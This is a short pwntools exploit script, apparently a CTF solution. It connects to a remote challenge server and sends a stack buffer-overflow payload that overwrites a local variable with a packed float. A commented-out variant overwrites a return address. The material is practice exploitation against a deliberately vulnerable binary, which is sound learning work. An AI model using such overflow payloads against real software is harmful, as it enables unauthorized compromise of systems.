from pwn import *
context.terminal=['tmux','splitx','-h']
context.log_level='debug'

p=remote('cssc.vul337.team',49323)
# p=process("./overflow")

# payload=136*b'A'+4*b'B'+p32(0x8048320)+4*b'0'+p32(0x0804A024)
# # payload=b'233'
# p.sendafter(b'What\'s your name? \n',payload)

import struct

def float2byte(num):
    return struct.pack('<f',num)

print(float2byte(11.28125))

print(len(float2byte(11.28125)))

payload=b'a'*(0x30-4)+float2byte(11.28125)

# p.sendafter("Let's guess the number.\n",payload)
# p.interactive()

p.sendline(payload)

p.interactive()